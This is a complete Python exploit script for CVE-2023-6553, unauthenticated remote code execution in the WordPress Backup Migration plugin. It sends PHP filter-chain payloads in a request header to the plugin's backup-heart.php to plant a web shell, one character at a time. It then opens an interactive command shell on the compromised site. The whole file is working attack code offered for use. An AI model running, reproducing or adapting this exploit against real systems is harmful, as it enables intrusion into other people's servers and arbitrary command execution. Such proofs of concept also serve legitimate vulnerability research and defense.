import sys
import random
import string
import argparse
import requests

from rich.console import Console
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from php_filter_chain import PHPFilterChainGenerator
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class CVE_2023_6553:
    """
    A class to exploit the CVE-2023-6553 vulnerability.

    Attributes:
        base_url (str): Base URL of the target website.
        random_file_name (str): Randomly generated file name used for exploitation.
    """

    def __init__(self, base_url):
        """
        Initializes the CVE_2023_6553 instance.

        Args:
            base_url (str): The base URL of the target website.
            file_name (str, optional): Specific file name to use. If not provided, a random name is generated.
        """

        self.console = Console()
        self.base_url = base_url
        self.random_file_name = (
            "".join(random.choices(string.ascii_letters + string.digits, k=3)) + ".php"
        )

    def generate_php_filter_payload(self, command):
        """
        Generates a PHP filter payload for the given command.

        Args:
            command (str): The command to be executed on the target system.

        Returns:
            str: The generated PHP filter payload.
        """

        generator = PHPFilterChainGenerator()
        return generator.generate_filter_chain(command)

    def send_payload(self, payload):
        """
        Sends a payload to the target URL.

        Args:
            payload (str): The payload to be sent.

        Returns:
            bool: True if the payload was successfully sent, False otherwise.
        """

        headers = {"Content-Dir": payload}

        try:
            response = requests.post(
                f"{self.base_url}/wp-content/plugins/backup-backup/includes/backup-heart.php",
                headers=headers,
                verify=False,
            )
            return response.status_code == 200
        except requests.exceptions.RequestException as e:
            print("Request failed:", e)
            return False

    @staticmethod
    def char_to_hex_escaped(char):
        """
        Converts a character to its hex-escaped form.

        Args:
            char (str): The character to escape.

        Returns:
            str: Hex-escaped representation of the character.
        """

        return "\\x" + "{:02x}".format(ord(char))

    def check_vulnerability(self, string_to_write):
        """
        Checks the vulnerability by writing a string to a file on the server.

        Args:
            string_to_write (str): The string to write to the file.

        Returns:
            bool: True if the operation was successful, False otherwise.
        """

        init_command = f"<?php `echo -n '' > {self.random_file_name}`; ?>"
        print(f"Initialising {self.random_file_name}...", end="\r")
        if self.send_payload(self.generate_php_filter_payload(init_command)):
            print(f"{self.random_file_name} initialised successfully.")
        else:
            print(f"Failed to initialise {self.random_file_name}")
            return

        written_chars = ""
        print("Writing: ", end="")

        for char in string_to_write:
            hex_escaped_char = self.char_to_hex_escaped(char)
            command = (
                f"<?php `echo -n '{hex_escaped_char}' >> {self.random_file_name}`; ?>"
            )
            if not self.send_payload(self.generate_php_filter_payload(command)):
                self.console.print(
                    f"\n[bold red]Failed to send payload for character: {char}[/bold red]"
                )
                break

            written_chars += char
            self.console.print(f"[bold cyan]{written_chars}[/bold cyan]", end="\r")
            sys.stdout.flush()
        else:
            self.console.print(
                f"\n[bold green]All characters sent successfully.[/bold green]"
            )
            return True

    def retrieve_command_output(self, command):
        """
        Retrieves the output of a command executed via the vulnerability.

        Args:
            command (str): The command to execute.

        Returns:
            str: The output of the command.
        """

        payload = {"0": command}
        try:
            response = requests.get(
                f"{self.base_url}/wp-content/plugins/backup-backup/includes/{self.random_file_name}",
                params=payload,
                verify=False,
            )
            return response.text
        except requests.exceptions.RequestException as e:
            return "Error retrieving command output: " + str(e)


def interactive_shell(cve_exploit):
    """
    Starts an interactive shell for exploiting the vulnerability.

    Args:
        cve_exploit (CVE_2023_6553): An instance of the CVE_2023_6553 class.
    """

    console = Console()
    session = PromptSession(InMemoryHistory())

    while True:
        try:
            cmd = session.prompt(HTML("<ansired><b># </b></ansired>")).strip().lower()
            if cmd == "exit":
                break
            if cmd == "clear":
                console.clear()
                continue

            output = cve_exploit.retrieve_command_output(cmd)
            console.print(f"[bold green]{output}[/bold green]")

        except KeyboardInterrupt:
            console.print(f"[bold yellow][+] Exiting...[/bold yellow]")
            break


def main():
    """
    Main function to execute the script.
    """

    parser = argparse.ArgumentParser(
        description="Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution"
    )

    parser.add_argument("base_url", help="Base URI", nargs="?", default=None)

    args = parser.parse_args()

    if args.base_url:
        base_url = args.base_url

        cve_exploit = CVE_2023_6553(base_url)
        string_to_write = "<?php echo `$_GET[0]`;?>"
        success = cve_exploit.check_vulnerability(string_to_write)

        if success:
            interactive_shell(cve_exploit)
        else:
            print("Failed to write all characters. Shell will not be launched.")
    else:
        print("No base URL provided. Exiting.")


if __name__ == "__main__":
    main()
